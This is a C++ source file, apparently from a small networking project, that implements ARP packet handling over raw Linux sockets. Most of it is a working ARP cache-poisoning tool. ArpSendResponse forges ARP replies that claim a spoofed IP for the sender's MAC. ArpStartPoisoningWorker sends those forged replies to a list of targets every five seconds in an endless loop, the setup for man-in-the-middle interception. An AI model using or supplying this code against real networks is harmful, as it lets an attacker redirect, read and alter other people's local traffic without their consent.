/* ========================================================================
   $SOURCE FILE
   $File: arp.cpp $
   $Program: $
   $Developer: Jordan Marling $
   $Created On: 2015/10/27 $
   $Functions: $
static void *ArpResolve(void *args);
static void *ArpStartPoisoningWorker(void *args);
int ArpSetupSocket(uint32_t recv_timeout_ms)
int ArpResolveIP(const char *interface, uint32_t ip_address, char *mac_address)
int ArpSendRequest(const char *interface, uint32_t ip_address)
int ArpGetResponse(int sd, uint32_t *ip_address, char *mac)
int ArpSendResponse(int sd, const char *interface, uint32_t spoof_ip_address, char *target_mac, uint32_t target_ip_address)
pthread_t ArpStartPoisoning(const char *interface, ArpPoison *poisons, int poison_count)

   $Description: This file contains all functions related to the ARP protocol. $
   $Revisions: $
   ======================================================================== */

#include "arp.h"

#include <arpa/inet.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#pragma pack(push, 1)
struct ArpPacket
{
    // Ethernet Header
    char MAC_dest[6];
    char MAC_src[6];
    uint16_t EtherType;

    // ARP data
    uint16_t HardwareType;
    uint16_t Protocol;
    uint8_t HardwareSize;
    uint8_t ProtocolSize;
    uint16_t Opcode;
    char SenderMAC[6];
    uint32_t SenderIP;
    char TargetMAC[6];
    uint32_t TargetIP;

    // Ethernet Padding
    char Padding[18];
};
#pragma pack(pop)

struct ArpPoisonInfo
{
    const char *Interface;
    ArpPoison *PoisonList;
    int PoisonListCount;
};

struct ArpResolveInfo
{
    uint32_t IPAddress;
    char MACAddress[6];
    char finished;
};

static void *ArpResolve(void *args);
static void *ArpStartPoisoningWorker(void *args);

/* ========================================================================
   $ FUNCTION
   $ Name: ArpSetupSocket $
   $ Prototype: int ArpSetupSocket(uint32_t recv_timeout_ms) $
   $ Params: 
   $    recv_timeout_ms: Timeout time in milliseconds $
   $ Description: This sets up an ARP socket with the specified timeout $
   ======================================================================== */
int ArpSetupSocket(uint32_t recv_timeout_ms)
{
    int sd;
    struct timeval tv;
    int sec, usec;

    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        perror("Error opening raw socket.");
        return -1;
    }

    // Convert the time to microseconds
    recv_timeout_ms *= 1000;
    sec = recv_timeout_ms / 1000000;
    usec = recv_timeout_ms % 1000000;
    tv.tv_sec = sec;
    tv.tv_usec = usec;

    if (setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv)) == -1)
    {
        printf("Error setting recv timeout to: %dms\n", recv_timeout_ms);
        return -1;
    }

    return sd;
}

/* ========================================================================
   $ FUNCTION
   $ Name: ArpResolveIP $
   $ Prototype: int ArpResolveIP(const char *interface, uint32_t ip_address, char *mac_address) $
   $ Params: 
   $    interface: The interface to use $
   $    ip_addresss: The IP address to resolve $
   $    mac_address: The location that the MAC address should be put into $
   $ Description:  $
   ======================================================================== */
int ArpResolveIP(const char *interface, uint32_t ip_address, char *mac_address)
{
    ArpResolveInfo *info;
    // char *memory;

    // Setup data structure to communicate with child thread
    info = (ArpResolveInfo*)malloc(sizeof(ArpResolveInfo));
    info->IPAddress = ip_address;
    memset(info->MACAddress, 0, 6);
    info->finished = 0;

    // Spawn child thread to read arp responses
// #define STACK_SIZE (64 * 1024)
    // memory = (char*)mmap(0, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN, -1, 0);
    // clone(&ArpResolve, memory + STACK_SIZE, CLONE_VM | CLONE_FILES, info);

    pthread_t child_id;
    pthread_create(&child_id, 0, ArpResolve, info);

    while (info->finished == 0)
    {
        ArpSendRequest(interface, ip_address);

        // Sleep 100ms.
        usleep(100000);
    }

    memcpy(mac_address, info->MACAddress, 6);

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: ArpSendRequest $
   $ Prototype: int ArpSendRequest(const char *interface, uint32_t ip_address) $
   $ Params: 
   $    interface: The interface to use $
   $    ip_address: The IP address to send the ARP request to. $
   $ Description: This function sends an ARP request to the specified IP address $
   ======================================================================== */
int ArpSendRequest(const char *interface, uint32_t ip_address)
{

    int sd;
    struct ifreq ifr;
    ArpPacket ArpRequest = {0};
    struct sockaddr_ll sockaddr = {0};

    sd = ArpSetupSocket(100);
    if (sd == -1)
    {
        return -1;
    }

    // Put the interface name into the struct
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    // Get our MAC address
    if (ioctl(sd, SIOCGIFHWADDR, &ifr) == -1)
    {
        printf("ArpSendRequest: Error getting the MAC address.\n");
        return -1;
    }

    // Ethernet
    memcpy(ArpRequest.MAC_src, ifr.ifr_hwaddr.sa_data, 6);
    memset(ArpRequest.MAC_dest, 0xFF, 6);
    ArpRequest.EtherType = htons(ETHERTYPE_ARP);

    // Get the IP address
    if (ioctl(sd, SIOCGIFADDR, &ifr, sizeof(ifr)) == -1)
    {
        printf("\nError getting the interface index for: %s\n", interface);
        return -1;
    }

    // ARP
    ArpRequest.HardwareType = htons(ARPHRD_ETHER);
    ArpRequest.Protocol = htons(0x0800); // IP protocol
    ArpRequest.HardwareSize = 6; // MAC address length
    ArpRequest.ProtocolSize = 4; // IP address length
    ArpRequest.Opcode = htons(ARPOP_REQUEST);

    memcpy(ArpRequest.SenderMAC, ArpRequest.MAC_src, 6);
    ArpRequest.SenderIP = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr; // My IP
    memset(ArpRequest.TargetMAC, 0x00, 6);
    ArpRequest.TargetIP = htonl(ip_address); // Their IP

    memset(ArpRequest.Padding, 0x00, 18);

    // Set the socket address information
    sockaddr.sll_family = AF_PACKET;
    sockaddr.sll_ifindex = ifr.ifr_ifindex;
    sockaddr.sll_protocol = htons(ETH_P_ARP);
    sockaddr.sll_halen = ETH_ALEN;
    memset(sockaddr.sll_addr, 0xFF, 6);

    if (bind(sd, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == -1)
    {
        printf("Error binding to interface.\n");
        return -1;
    }

    // if (sendto(sd, &ArpRequest, sizeof(ArpRequest), 0, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) < 0)
    if (write(sd, &ArpRequest, sizeof(ArpRequest)) < 0)
    {
        printf("Error sending arp request.\n");
        return -1;
    }

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: ArpGetResponse $
   $ Prototype: int ArpGetResponse(int sd, uint32_t *ip_address, char *mac) $
   $ Params: 
   $    sd: The socket descriptor to use $
   $    ip_address: The IP address that is in the next arp response $
   $    mac: The MAC address that is in the next arp response $
   $ Description: Returns the IP address and MAC address from the next Arp Response $
   ======================================================================== */
int ArpGetResponse(int sd, uint32_t *ip_address, char *mac)
{
    ArpPacket ArpRequest;

    if (recvfrom(sd, &ArpRequest, sizeof(ArpRequest), 0, 0, 0) < 0)
    {
        return -1;
    }

    // Copy the IP Address
    *ip_address = ntohl(ArpRequest.SenderIP);
    memcpy(mac, ArpRequest.SenderMAC, 6);

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: ArpSendResponse $
   $ Prototype: int ArpSendResponse(int sd, const char *interface, uint32_t spoof_ip_address, char *target_mac, uint32_t target_ip_address) $
   $ Params: 
   $    sd: The socket descriptor $
   $    interface: The interface to use $
   $    spoof_ip_address: The IP address for this machine to spoof $
   $    target_mac: The target machines MAC address $
   $    target_ip_address: The target machines IP address $
   $ Description: This sends a spoofed arp response telling the target machine that
                  this machine is the spoofed IP $
   ======================================================================== */
int ArpSendResponse(int sd, const char *interface, uint32_t spoof_ip_address, char *target_mac, uint32_t target_ip_address)
{
    struct ifreq ifr;
    ArpPacket ArpResponse = {0};
    struct sockaddr_ll sockaddr = {0};

    // Put the interface name into the struct
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    // Get our MAC address
    if (ioctl(sd, SIOCGIFHWADDR, &ifr) == -1)
    {
        perror("ArpSendResponse:ioctl");
        printf("ArpSendResponse: Error getting the MAC address for interface: %s\n", interface);
        return -1;
    }

    // Ethernet
    memcpy(ArpResponse.MAC_src, ifr.ifr_hwaddr.sa_data, 6);
    memcpy(ArpResponse.MAC_dest, target_mac, 6);
    ArpResponse.EtherType = htons(ETHERTYPE_ARP);

    // Get the IP address
    if (ioctl(sd, SIOCGIFADDR, &ifr, sizeof(ifr)) == -1)
    {
        printf("Error getting the interface index.\n");
        return -1;
    }

    // ARP
    ArpResponse.HardwareType = htons(ARPHRD_ETHER);
    ArpResponse.Protocol = htons(0x0800); // IP protocol
    ArpResponse.HardwareSize = 6; // MAC address length
    ArpResponse.ProtocolSize = 4; // IP address length
    ArpResponse.Opcode = htons(ARPOP_REPLY);

    memcpy(ArpResponse.SenderMAC, ArpResponse.MAC_src, 6);
    ArpResponse.SenderIP = htonl(spoof_ip_address);
    memset(ArpResponse.TargetMAC, 0x00, 6);
    ArpResponse.TargetIP = htonl(target_ip_address); // Their IP

    memset(ArpResponse.Padding, 0x00, 18);

    // Set the socket address information
    sockaddr.sll_family = AF_PACKET;
    sockaddr.sll_ifindex = ifr.ifr_ifindex;
    sockaddr.sll_protocol = htons(ETH_P_ARP);
    sockaddr.sll_halen = ETH_ALEN;
    memset(sockaddr.sll_addr, 0xFF, 6);

    if (bind(sd, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == -1)
    {
        perror("bind");
        return -1;
    }

    if (write(sd, &ArpResponse, sizeof(ArpResponse)) < 0)
    {
        printf("Error sending arp request.\n");
        return -1;
    }

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: ArpStartPoisoning $
   $ Prototype: pthread_t ArpStartPoisoning(const char *interface, ArpPoison *poisons, int poison_count) $
   $ Params: 
   $    interface: The interface to use $
   $    poisons: An array of IP addresses/MAC addresses to spoof $
   $    poison_count: The length of the poisons array $
   $ Description: This function creates a thread to repeatedly ARP poison the targets $
   ======================================================================== */
pthread_t ArpStartPoisoning(const char *interface, ArpPoison *poisons, int poison_count)
{

    ArpPoisonInfo *poison_info = (ArpPoisonInfo*)malloc(sizeof(ArpPoisonInfo));
    poison_info->Interface = interface;
    poison_info->PoisonList = poisons;
    poison_info->PoisonListCount = poison_count;

    // Start a listening thread
// #define STACK_SIZE (64 * 1024)
    // char *listener_memory = (char*)mmap(0, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN, -1, 0);
    // pid_t child_id = clone(&ArpStartPoisoningWorker, listener_memory + STACK_SIZE, CLONE_VM | CLONE_FILES, poison_info);

    pthread_t child_id;
    pthread_create(&child_id, 0, ArpStartPoisoningWorker, poison_info);

    return child_id;
}

/* ========================================================================
   $ FUNCTION
   $ Name: void *ArpResolve $
   $ Prototype: static void *ArpResolve(void *args) $
   $ Params: 
   $    args: TheA ArpResolveInfo struct to put the arp response into $
   $ Description: This function is run on a separate thread which listens for arp responses $
   ======================================================================== */
static void *ArpResolve(void *args)
{
    ArpResolveInfo *info = (ArpResolveInfo*)args;
    int sd;

    uint32_t tmpip = 0;
    char tmpmac[6];

    sd = ArpSetupSocket(100);
    if (sd == -1)
    {
        printf("Error creating socket.\n");
        return 0;
    }

    do {
        if (ArpGetResponse(sd, &tmpip, tmpmac) == 0)
        {
            memcpy(info->MACAddress, tmpmac, 6);
        }
    } while (tmpip != info->IPAddress);

    info->finished = 1;

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: void *ArpStartPoisoningWorker $
   $ Prototype: static void *ArpStartPoisoningWorker(void *args) $
   $ Params: 
   $    args: The ArpPoisonInfo struct $
   $ Description: This function is run on a separate thread to poison the targets
                  within the ArpPoisonInfo struct. $
   ======================================================================== */
static void *ArpStartPoisoningWorker(void *args)
{
#define POISON_INTERVAL 5000 // In milliseconds

    ArpPoisonInfo *info = (ArpPoisonInfo*)args;
    int sd;

    sd = ArpSetupSocket(100);
    if (sd == -1)
    {
        return 0;
    }

    while (1)
    {
        for(int i = 0; i < info->PoisonListCount; i++)
        {
            ArpSendResponse(sd, info->Interface, info->PoisonList[i].SpoofIP, info->PoisonList[i].TargetMAC, info->PoisonList[i].TargetIP);
        }

        usleep(POISON_INTERVAL * 1000);
    }

    return 0;
}
